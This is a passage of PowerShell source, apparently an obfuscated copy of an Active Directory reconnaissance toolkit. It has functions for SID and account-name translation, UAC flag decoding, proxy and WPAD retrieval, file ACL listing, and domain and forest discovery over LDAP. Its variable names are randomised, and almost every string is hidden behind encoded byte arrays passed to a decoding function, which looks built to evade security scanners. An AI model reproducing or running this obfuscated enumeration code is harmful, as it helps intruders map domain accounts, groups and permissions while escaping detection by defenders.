                'S-1-5-14'      { 'Remote Interactive Logon' }
                'S-1-5-15'      { 'This Organization ' }
                'S-1-5-17'      { 'This Organization ' }
                'S-1-5-18'      { 'Local System' }
                'S-1-5-19'      { 'NT Authority' }
                'S-1-5-20'      { 'NT Authority' }
                'S-1-5-80-0'    { 'All Services ' }
                'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                'S-1-5-32-545'  { 'BUILTIN\Users' }
                'S-1-5-32-546'  { 'BUILTIN\Guests' }
                'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                Default { 
                    $RIIU = (New-Object System.Security.Principal.SecurityIdentifier($F3OOnS))
                    $RIIU.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            # Write-Warning "Invalid SID: $SID"
            $SID
        }
    }
}


function Convert-NT4toCanonical {
<#
    .SYNOPSIS

        Converts a user/group NT4 name (i.e. dev/john) to canonical format.

        Based on Bill Stewart's code from this article: 
            http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats

    .PARAMETER ObjectName

        The user/group name to convert, needs to be in 'DOMAIN\user' format.

    .EXAMPLE

        PS C:\> Convert-NT4toCanonical -ObjectName "dev\dfm"
        
        Returns "dev.testlab.local/Users/Dave"

    .LINK

        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $ObjectName
    )

    process {

        $ObjectName = $ObjectName -replace "/","\"
        
        if($ObjectName.contains("\")) {
            # if we get a DOMAIN\user format, try to extract the domain
            $Domain = $ObjectName.split("\")[0]
        }

        # Accessor functions to simplify calls to NameTranslate
        function Invoke-Method([__ComObject] $Object, [String] $CByfstuP, $u3zVG96v) {
            $aZKCn1r = $Object.GetType().InvokeMember($CByfstuP, (HandleResult95 @(186,47,207,217,220,134,66,153,189,47,172,219,223,243,15,158) @(233,120,250,235,190,180,54,245)), $Null, $Object, $u3zVG96v)
            if ( $aZKCn1r ) { $aZKCn1r }
        }
        function Set-Property([__ComObject] $Object, [String] $iNusS, $u3zVG96v) {
            [Void] $Object.GetType().InvokeMember($iNusS, (HandleResult95 @(230,56,64,240,105,182,220,224,208,77,64,185,88,182,253,171) @(179,10,22,192,60,254,150,150)), $Null, $Object, $u3zVG96v)
        }

        $B89w = New-Object -ComObject NameTranslate

        try {
            Invoke-Method $B89w (HandleResult95 @(128,25,155,183,111,146,115,147) @(211,78,174,199,11)) (1, $Domain)
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug ((HandleResult95 @(22,62,73,169,52,143,70,35,2,49,188,102,221,76,6,86,96,189,16,201,108,118,30,107,180,17,233,104,37,49,54,160,50,255,77,52,4,106,146,18,222,61,113,84,89,136,28,140,67,17,83,86,158,30,238,121,21,84,69,165,52,142,58,52,63,49,150,37,243,102,5,91) @(68,102,3,208,86,188,15)) + $_)
        }

        Set-Property $B89w (HandleResult95 @(99,191,182,133,67,77,19,179,104,218,132,129,67,17,15,136,80,204,227,208) @(50,141,222,237,32,127,69,224)) (0x60)

        try {
            Invoke-Method $B89w (HandleResult95 @(167,132,220,130) @(242,182,138,178,98,88,222)) (3, $ObjectName)
            (Invoke-Method $B89w (HandleResult95 @(28,5,185,43) @(78,55,239,27,29)) (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug ((HandleResult95 @(83,77,96,53,99,38,99,43,101,39,70,124,96,86,104,124,98,120,108,57,98,39,82,36,101,82,127,43,84,39,124,124,77,37,78,32,101,86,104,60,99,124,104,8,99,39,31,126,91,77,96,124,77,64,31,25,79,93,120,58,80,39,108,57,99,39,31,60,88,39,108,63,78,124,107,113) @(1,21,42,76)) + $_)
        }
    }
}


function Convert-CanonicaltoNT4 {
<#
    .SYNOPSIS

        Converts a user@fqdn to NT4 format.

    .PARAMETER ObjectName

        The user/group name to convert, needs to be in 'DOMAIN\user' format.

    .LINK

        http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
#>

    [CmdletBinding()]
    param(
        [String] $ObjectName
    )

    $Domain = ($ObjectName -split "@")[1]

    $ObjectName = $ObjectName -replace "/","\"

    # Accessor functions to simplify calls to NameTranslate
    function Invoke-Method([__ComObject] $object, [String] $CByfstuP, $u3zVG96v) {
        $aZKCn1r = $object.GetType().InvokeMember($CByfstuP, (HandleResult95 @(39,3,225,201,165,173,178,114,32,3,130,203,166,216,255,117) @(116,84,212,251,199,159,198,30)), $NULL, $object, $u3zVG96v)
        if ( $aZKCn1r ) { $aZKCn1r }
    }
    function Set-Property([__ComObject] $object, [String] $iNusS, $u3zVG96v) {
        [Void] $object.GetType().InvokeMember($iNusS, (HandleResult95 @(206,147,143,224,226,127,252,110,248,230,143,169,211,127,221,37) @(155,161,217,208,183,55,182,24)), $NULL, $object, $u3zVG96v)
    }

    $B89w = New-Object -comobject NameTranslate

    try {
        Invoke-Method $B89w (HandleResult95 @(163,203,42,40,148,221,34,101) @(240,156,31,88)) (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { }

    Set-Property $B89w (HandleResult95 @(70,112,66,214,181,37,20,121,228,129,77,46,73,208,156,127,32,107,131,235) @(23,66,42,190,214)) (0x60)

    try {
        Invoke-Method $B89w (HandleResult95 @(218,237,37,125) @(143,223,115,77,66,187)) (5, $ObjectName)
        (Invoke-Method $B89w (HandleResult95 @(178,197,175,61) @(224,247,249,13,76,198,23)) (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}


function ConvertFrom-UACValue {
<#
    .SYNOPSIS

        Converts a UAC int value to human readable form.

    .PARAMETER Value

        The int UAC value to convert.

    .PARAMETER ShowAll

        Show all UAC values, with a + indicating the value is currently set.

    .EXAMPLE

        PS C:\> ConvertFrom-UACValue -Value 66176

        Convert the UAC value 66176 to human readable format.

    .EXAMPLE

        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue

        Convert the UAC value for 'jason' to human readable format.

    .EXAMPLE

        PS C:\> Get-NetUser jason | select useraccountcontrol | ConvertFrom-UACValue -ShowAll

        Convert the UAC value for 'jason' to human readable format, showing all
        possible UAC values.
#>
    
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $Value,

        [Switch]
        $ShowAll
    )

    begin {

        # values from https://support.microsoft.com/en-us/kb/305144
        $VUkw = New-Object System.Collections.Specialized.OrderedDictionary
        $VUkw.Add((HandleResult95 @(219,2,7,48,221,100,11,54) @(142,50,73,99)), 1)
        $VUkw.Add((HandleResult95 @(82,102,195,16,87,2,219,27,85,118,223,30,86,3,203,23,87,118,216,105) @(3,51,141,84)), 2)
        $VUkw.Add((HandleResult95 @(12,174,2,142,9,10,185,113,149,55,102,184,105,150,29,9,184,109,138,29,13,170,6,253) @(95,235,59,192,91)), 8)
        $VUkw.Add((HandleResult95 @(114,255,229,214,225,128,248,7,112,251,225,175) @(38,186,220,146,178,176,193,81)), 16)
        $VUkw.Add((HandleResult95 @(245,219,143,33,35,166,8,229,198,249,64,38,193,42,234,216,156,32,39,170) @(160,158,201,117,118,151,108)), 32)
        $VUkw.Add((HandleResult95 @(209,161,117,27,53,232,224,161,107,127,46,155,208,136,97,41,49,233,236,166,103,36,4,159) @(132,228,51,79,96,217)), 64)
        $VUkw.Add((HandleResult95 @(246,1,244,57,241,56,173,44,242,17,151,56,252,101,147,59,243,18,147,27,241,18,165,56,252,100,135,48,240,17,248,37,246,1,144,64) @(164,84,193,125)), 128)
        $VUkw.Add((HandleResult95 @(26,135,58,32,7,117,117,135,58,56,16,126,31,151,34,44,4,118,26,164,61,59,28,119,24,243,58,33,4,114,113,255) @(76,194,108,110,82,51)), 256)
        $VUkw.Add((HandleResult95 @(238,201,49,126,79,106,17,127,226,146,78,105,74,15,110,100,238,206,89,16) @(186,162,8,45,27,63,87,50)), 512)
        $VUkw.Add((HandleResult95 @(65,87,253,88,77,68,72,141,89,47,35,64,155,88,42,116,84,142,71,73,71,51,154,107,78,71,76,140,89,46,68,77,158,76,34,47) @(18,2,200,13,31)), 2048)
        $VUkw.Add((HandleResult95 @(106,64,126,19,95,167,114,37,22,22,94,220,104,64,114,38,90,208,118,38,18,113,94,240,109,37,9,4,88,167,106,63,17,1,49,171) @(60,112,71,64,12,150)), 4096)
        $VUkw.Add((HandleResult95 @(150,90,118,85,152,18,107,144,50,17,84,157,47,107,141,63,120,54,136,61,108,243,83,118,82,162,40,0) @(195,106,32,6,206,121,61)), 8192)
        $VUkw.Add((HandleResult95 @(185,129,188,82,35,25,243,231,188,130,199,87,32,52,156,199,190,129,195,73,32,110,174,241,190,175,212,32) @(235,196,133,29,117,95,202,161)), 65536)
        $VUkw.Add((HandleResult95 @(121,117,139,34,153,8,85,112,236,70,248,119,117,16,248,50,144,8,20,118,234,26,144,5) @(45,32,190,118,193,56)), 131072)
        $VUkw.Add((HandleResult95 @(13,77,245,30,164,181,99,28,44,146,22,180,129,0,18,59,145,10,167,147,100,51,43,129) @(88,125,196,92,241,217,49)), 262144)
        $VUkw.Add((HandleResult95 @(22,186,155,16,24,113,174,151,20,11,121,187,133,119,7,38,174,148,16,0,18,169,181,4,27,5,144,129,18,42,125,193) @(64,252,209,70,77)), 524288)
        $VUkw.Add((HandleResult95 @(148,98,110,125,30,240,91,17,124,3,150,65,6,126,20,134,91,22,21,123) @(192,9,87,40,70)), 1048576)
        $VUkw.Add((HandleResult95 @(37,118,210,85,19,231,34,53,117,173,42,7,133,38,31,70,200,35,126,154,39,34,29,161) @(115,32,156,19,75,215,112)), 2097152)
        $VUkw.Add((HandleResult95 @(25,221,72,118,29,222,72,106,25,206,55,95,30,222,59,127,26,206,39,108,24,217,76,4) @(75,152,113,57)), 4194304)
        $VUkw.Add((HandleResult95 @(53,36,91,15,195,14,25,196,53,10,79,61,196,105,21,197,51,55,87,29,196,126,64,169) @(96,97,29,91,150,63,125,148)), 8388608)
        $VUkw.Add((HandleResult95 @(8,79,60,70,174,111,91,48,66,189,103,92,34,33,194,28,95,32,66,178,6,57,44,64,174,50,48,51,66,174,38,79,36,32,189,11,90,35,41,180) @(94,9,118,16,251)), 16777216)
        $VUkw.Add((HandleResult95 @(37,20,236,143,38,20,198,158,36,23,147,136,34,4,228,143,34,7,248,136,40,97,236,152,33,97,147,138,36,61,251,225) @(112,81,170,220)), 67108864)

    }

    process {

        $hRmvA = New-Object System.Collections.Specialized.OrderedDictionary

        if($Value -is [Int]) {
            $vJVX = $Value
        }

        if ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $vJVX = $Value.useraccountcontrol
            }
        }

        if($vJVX) {

            if($ShowAll) {
                foreach ($ZVFUQeg in $VUkw.GetEnumerator()) {
                    if( ($vJVX -band $ZVFUQeg.Value) -eq $ZVFUQeg.Value) {
                        $hRmvA.Add($ZVFUQeg.Name, ($($ZVFUQeg.Value) + "+"))
                    }
                    else {
                        $hRmvA.Add($ZVFUQeg.Name, ($($ZVFUQeg.Value)))
                    }
                }
            }
            else {
                foreach ($ZVFUQeg in $VUkw.GetEnumerator()) {
                    if( ($vJVX -band $ZVFUQeg.Value) -eq $ZVFUQeg.Value) {
                        $hRmvA.Add($ZVFUQeg.Name, ($($ZVFUQeg.Value)))
                    }
                }                
            }
        }

        $hRmvA
    }
}


function Get-Proxy {
<#
    .SYNOPSIS
    
        Enumerates the proxy server and WPAD conents for the current user.

    .PARAMETER ComputerName

        The computername to enumerate proxy settings on, defaults to local host.

    .EXAMPLE

        PS C:\> Get-Proxy 
        
        Returns the current proxy settings.
#>
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )

    process {
        try {
            $iIbun = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('CurrentUser', $ComputerName)
            $TMzomwvM = $iIbun.OpenSubkey((HandleResult95 @(23,250,67,36,250,4,174,56,54,199,20,169,34,38,157,50,147,73,41,218,33,248,67,14,200,4,178,25,53,158,46,191,32,36,149,113,169,75,27,207,19,249,44,26,207,47,156,15,7,234,24,166,25,13,226,50,168,72,86,207,26,143,22,22,200,5,156,3,1,193,20,250,51,37,226,46,174,50,49,220,32,167,30,25) @(66,202,122,99,172)))
            $MKXK = $TMzomwvM.GetValue('ProxyServer')
            $nrcbyfg1 = $TMzomwvM.GetValue('AutoConfigURL')

            if($nrcbyfg1 -and ($nrcbyfg1 -ne "")) {
                try {
                    $xmtN = (New-Object Net.Webclient).DownloadString($nrcbyfg1)
                }
                catch {
                    $xmtN = ""
                }
            }
            else {
                $xmtN = ""
            }
            
            if($MKXK -or $nrcbyfg1) {

                $Properties = @{
                    'ProxyServer' = $MKXK
                    'AutoConfigURL' = $nrcbyfg1
                    'Wpad' = $xmtN
                }
                
                New-Object -TypeName PSObject -Property $Properties
            }
            else {
                Write-Warning ((HandleResult95 @(194,244,238,225,239,222,211,160,227,196,253,254,181,180,218,166,253,145,234,249,204,170,155,225,214,251,160,231,228,225,199,254,140,235,181,239,208,151,187,177) @(150,153,214,134,140)) + $ComputerName)
            }
        }
        catch {
            Write-Warning ((HandleResult95 @(113,155,194,29,208,16,138,239,62,229,22,242,234,51,228,90,154,208,54,194,65,174,235,3,209,107,137,254,1,250,72,164,235,86,228,19,167,207,8,199,121,240,197,3,232,78,250,241,45,243,30,254) @(35,195,136,100,178)) + $ComputerName)
        }
    }
}


function Get-PathAcl {

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        $Path,

        [Switch]
        $Recurse
    )

    begin {

        function Convert-FileRight {

            # From http://stackoverflow.com/questions/28029872/retrieving-security-descriptor-and-getting-number-for-filesystemrights

            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )

            $naAV3RrG = @{
              [uint32]'0x80000000' = 'GenericRead'
              [uint32]'0x40000000' = 'GenericWrite'
              [uint32]'0x20000000' = 'GenericExecute'
              [uint32]'0x10000000' = 'GenericAll'
              [uint32]'0x02000000' = 'MaximumAllowed'
              [uint32]'0x01000000' = 'AccessSystemSecurity'
              [uint32]'0x00100000' = 'Synchronize'
              [uint32]'0x00080000' = 'WriteOwner'
              [uint32]'0x00040000' = 'WriteDAC'
              [uint32]'0x00020000' = 'ReadControl'
              [uint32]'0x00010000' = 'Delete'
              [uint32]'0x00000100' = 'WriteAttributes'
              [uint32]'0x00000080' = 'ReadAttributes'
              [uint32]'0x00000040' = 'DeleteChild'
              [uint32]'0x00000020' = 'Execute/Traverse'
              [uint32]'0x00000010' = 'WriteExtendedAttributes'
              [uint32]'0x00000008' = 'ReadExtendedAttributes'
              [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
              [uint32]'0x00000002' = 'WriteData/AddFile'
              [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $dceEkOxS = @{
              [uint32]'0x1f01ff' = 'FullControl'
              [uint32]'0x0301bf' = 'Modify'
              [uint32]'0x0200a9' = 'ReadAndExecute'
              [uint32]'0x02019f' = 'ReadAndWrite'
              [uint32]'0x020089' = 'Read'
              [uint32]'0x000116' = 'Write'
            }

            $EdEA6QGM = @()

            # get simple permission
            $EdEA6QGM += $dceEkOxS.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $dceEkOxS[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # get remaining extended permissions
            $EdEA6QGM += $naAV3RrG.Keys |
                            ? { $FSR -band $_ } |
                            % { $naAV3RrG[$_] }

            ($EdEA6QGM | ?{$_}) -join ","
        }
    }

    process {

        try {
            $McfsW1N = Get-Acl -Path $Path

            $McfsW1N.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | ForEach-Object {

                $XvUt5Mf = @()
                if ($_.IdentityReference -match '^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+') {
                    $Object = Get-ADObject -SID $_.IdentityReference
                    $XvUt5Mf = @()
                    $aimG = @($Object.objectsid)

                    if ($Recurse -and ($Object.samAccountType -ne (HandleResult95 @(65,238,71,218,6,10,79,152,75,145,18,68) @(14,170,6,235,75,112)))) {
                        $aimG += Get-NetGroupMember -SID $Object.objectsid | Select-Object -ExpandProperty MemberSid
                    }

                    $aimG | ForEach-Object {
                        $XvUt5Mf += ,@($_, (Convert-SidToName $_))
                    }
                }
                else {
                    $XvUt5Mf += ,@($_.IdentityReference.Value, (Convert-SidToName $_.IdentityReference.Value))
                }

                ForEach($Name in $XvUt5Mf) {
                    $LcCf = New-Object PSObject
                    $LcCf | Add-Member Noteproperty 'Path' $Path
                    $LcCf | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $LcCf | Add-Member Noteproperty 'IdentityReference' $Name[1]
                    $LcCf | Add-Member Noteproperty 'IdentitySID' $Name[0]
                    $LcCf | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $LcCf
                }
            }
        }
        catch {
            Write-Warning $_
        }
    }
}


function Get-NameField {
    # function that attempts to extract the appropriate field name
    # from various passed objects. This is so functions can have
    # multiple types of objects passed on the pipeline.
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        $Object
    )
    process {
        if($Object) {
            if ( [bool]($Object.PSobject.Properties.name -match (HandleResult95 @(28,218,105,214,208,201,125,129,34,218,105,196,211,217,17,198) @(70,157,92,172,177,142,68,251))) ) {
                # objects from Get-NetComputer
                $Object.dnshostname
            }
            elseif ( [bool]($Object.PSobject.Properties.name -match (HandleResult95 @(121,144,136,221,226,74,192,243) @(27,253,206,169,184))) ) {
                # objects from Get-NetDomainController
                $Object.name
            }
            else {
                # strings and catch alls
                $Object
            }
        }
        else {
            return $Null
        }
    }
}


function Convert-LDAPProperty {
    # helper to convert specific LDAP property result fields
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $DePCk = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq (HandleResult95 @(241,217,161,78,31,196,165,219,92,119,255,128) @(147,235,235,63,69))) -or ($_ -eq (HandleResult95 @(109,77,148,13,48,73,19,130,2,22,55,6,157,55,108,51) @(14,127,248,102,81)))) {
            # convert the SID to a string
            $DePCk[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0],0)).Value
        }
        elseif($_ -eq (HandleResult95 @(150,12,8,169,174,105,12,232,174,13,20,168,174,127,127,229) @(244,62,66,216))) {
            # convert the GUID to a string
            $DePCk[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif( ($_ -eq (HandleResult95 @(189,47,131,74,187,47,189,70,133,90,252,69) @(223,104,197,48))) -or ($_ -eq (HandleResult95 @(134,27,156,158,111,68,156,42,128,214,50,118,128,27,182,144,81,91,170,108,131,179,58,116) @(228,92,218,228,11,3))) -or ($_ -eq (HandleResult95 @(10,98,183,65,44,121,87,167,13,98,157,70,42,127,44,224) @(105,42,211,42,78,62,17,221))) -or ($_ -eq (HandleResult95 @(31,109,27,85,158,164,5,92,7,29,195,142,39,77,96,18) @(125,42,93,47,250,227))) -or ($_ -eq (HandleResult95 @(28,177,196,115,220,127,3,166,225,43,237,78,38,177,208,77,232,111,116,176) @(69,220,130,24,137,56))) ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $mTXSeLD = $Properties[$_][0]
                [Int32]$IHYkVX = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(28,35,103,250,46,34,73,252,44,10,90,169) @(79,100,11,148)), [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
                [Int32]$BlHrI  = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(90,253,128,202,206,175,170,119,222,248,196,166) @(14,186,185,249,155,232,236)),  [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
                $DePCk[$_] = ([datetime]::FromFileTime([Int64]((HandleResult95 @(198,202,152,240,252,127,251,182,191,143,128,12,198,214,128,243,254,115,187,191) @(139,130,240,199,177,59)) -f $IHYkVX, $BlHrI)))
            }
            else {
                $DePCk[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # convert misc com objects
            $ukaRebKN = $Properties[$_]
            try {
                $mTXSeLD = $ukaRebKN[$_][0]
                Write-Verbose $_
                [Int32]$IHYkVX = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(109,209,81,214,7,248,188,86,245,83,233,91) @(62,150,61,184,102,190,254)), [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
                [Int32]$BlHrI  = $mTXSeLD.GetType().InvokeMember((HandleResult95 @(52,59,83,94,254,169,204,141,4,61,87,80) @(96,124,106,109,171,238,138,244)),  [System.Reflection.BindingFlags]::GetProperty, $null, $mTXSeLD, $null)
                $DePCk[$_] = [Int64]((HandleResult95 @(87,238,71,163,9,81,106,146,96,220,117,34,87,242,95,160,11,93,42,155) @(26,166,47,148,68,21)) -f $IHYkVX, $BlHrI)
            }
            catch {
                $DePCk[$_] = $ukaRebKN[$_]
            }
        }
        elseif($Properties[$_].count -eq 1) {
            $DePCk[$_] = $Properties[$_][0]
        }
        else {
            $DePCk[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $DePCk
}



########################################################
#
# Domain info functions below.
#
########################################################

function Get-DomainSearcher {
<#
    .SYNOPSIS

        Helper used by various functions that takes an ADSpath and
        domain specifier and builds the correct ADSI searcher object.

    .PARAMETER Domain

        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ADSprefix

        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-DomainSearcher -Domain testlab.local

    .EXAMPLE

        PS C:\> Get-DomainSearcher -Domain testlab.local -DomainController SECONDARY.dev.testlab.local
#>

    [CmdletBinding()]
    param(
        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if(!$Domain) {
        $Domain = (Get-NetDomain).name
    }
    else {
        if(!$DomainController) {
            try {
                # if there's no -DomainController specified, try to pull the primary DC
                #   to reflect queries through
                $DomainController = ((Get-NetDomain).PdcRoleOwner).Name
            }
            catch {
                throw (HandleResult95 @(74,244,37,65,152,54,206,18,122,145,53,1,182,15,210,8,65,158,57,27,181,36,202,29,87,175,49,55,183,13,214,18,123,175,49,1,182,10,222,29,66,158,33,8,181,52,202,86,121,145,70,31,157,37,222,33,73,191,49,28,182,80,213,3,65,245,37,8,183,14,202,17,124,133,49,26,182,81,173,12,121,145,71,76) @(24,198,115,113,212,99,156,100))
            }
        }
    }

    $HjavDPP = (HandleResult95 @(112,90,53,18,82,224,203,82,83,16,109,58) @(36,31,103,80,7,164,164))

    if($DomainController) {
        $HjavDPP += $DomainController + "/"
    }
    if($ADSprefix) {
        $HjavDPP += $ADSprefix + ","
    }

    if($ADSpath) {
        if($ADSpath -like (HandleResult95 @(92,241,45,241,66,184,88,182) @(14,193,96,199))) {
            # if we're searching the global catalog
            $DistinguishedName = $AdsPath
            $HjavDPP = ""
        }
        else {
            if($ADSpath -like (HandleResult95 @(146,141,9,199,42,195,234,176,132,34,234,66) @(198,200,91,133,127,135,133))) {
                $ADSpath = $ADSpath.Substring(7)
            }
            $DistinguishedName = $ADSpath
        }
    }
    else {
        $DistinguishedName = ((HandleResult95 @(84,189,214,31) @(6,248,155,38)) + $($Domain.Replace('.', ',DC=')))
    }

    $HjavDPP += $DistinguishedName
    Write-Verbose ((HandleResult95 @(104,95,72,227,118,56,76,165,88,58,88,163,88,1,80,191,99,53,84,185,91,42,72,170,115,37,80,191,99,53,84,185,91,46,92,169,94,37,84,163,88,0,125,229,115,44,35,238) @(58,109,30,211)) + $HjavDPP)

    $rW6p = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$HjavDPP)
    $rW6p.PageSize = $PageSize
    $rW6p
}


function Get-NetDomain {
<#
    .SYNOPSIS

        Returns a given domain object.

    .PARAMETER Domain

        The domain name to query for, defaults to the current domain.

    .EXAMPLE

        PS C:\> Get-NetDomain -Domain testlab.local

    .LINK

        http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain
    )

    process {
        if($Domain) {
            $FB09 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($FB09)
            }
            catch {
                Write-Warning ((HandleResult95 @(204,89,222,142,173,190,94,237,68,225,172,148,172,125,246,114,236,161,166,157,114,168,47,222,131,179,194,119) @(154,30,182,226,228,246,16)) + $Domain + (HandleResult95 @(53,76,64,174,208,36,70,117,186,231,69,59,91,159,220,72,106,74,150,186,48,72,80,178,232,79,93,97,130,201,62,126,112,235,219,27,82,127,141,237,37,57,43,173,238,59,77,120,188,205,42,96,94,155,200,10,104,123,154,186,29,76,68,161,208,47,73,98,187,184,72,101,118,155,200,20,105,123,154,230,25,76,126,162,238,59,103,103,130,243,62,59,113,182,220,6,111,81,236,183) @(124,11,18,216,138)))
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}


function Get-NetForest {
<#
    .SYNOPSIS

        Returns a given forest object.

    .PARAMETER Forest

        The forest name to query for, defaults to the current domain.

    .EXAMPLE
    
        PS C:\> Get-NetForest -Forest external.domain
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        if($Forest) {
            $gpNYA5 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Forest)
            try {
                $ntkuQD1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($gpNYA5)
            }
            catch {
                Write-Debug ((HandleResult95 @(170,124,196,95,222,76,105,192,166,108,226,67,205,105,75,219,166,120,238,94,245,55,109,219,159,8,253,84) @(252,59,172,51,151,4,39,183)) + $Forest + (HandleResult95 @(123,153,161,6,104,134,190,23,80,179,202,64,123,153,165,68,83,134,189,64,126,157,177,26,80,237,165,3,104,157,177,5,80,237,162,23,107,179,166,23,107,236,202,5,86,153,181,26,86,153,165,27,126,157,177,6,81,183,177,64,83,153,165,9,104,141,177,0,81,236,199,30,86,157,177,24,80,183,177,28,87,153,159,10,86,153,159,5,104,167,177,64,81,176,165,10,86,157,199,77) @(50,222,243,112)))
                $Null
            }
        }
        else {
            # otherwise use the current forest
            $ntkuQD1 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }

        if($ntkuQD1) {
            # get the SID of the forest root
            $JwIjrNf = (New-Object System.Security.Principal.NTAccount($ntkuQD1.RootDomain,(HandleResult95 @(244,225,103,187,120,35,73,165) @(149,210,45,210,28,100,45)))).Translate([System.Security.Principal.SecurityIdentifier]).Value
            $u5Ie777 = $JwIjrNf -Split "-"
            $JwIjrNf = $u5Ie777[0..$($u5Ie777.length-2)] -join "-"
            $ntkuQD1 | Add-Member NoteProperty 'RootDomainSid' $JwIjrNf
            $ntkuQD1
        }
    }
}


function Get-NetForestDomain {
<#
    .SYNOPSIS

        Return all domains for a given forest.

    .PARAMETER Forest

        The forest name to query domain for.

    .PARAMETER Domain

        Return domains that match this term/wildcard.

    .EXAMPLE

        PS C:\> Get-NetForestDomain

    .EXAMPLE

        PS C:\> Get-NetForestDomain -Forest external.local
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest,

        [String]
        $Domain
    )

    process {
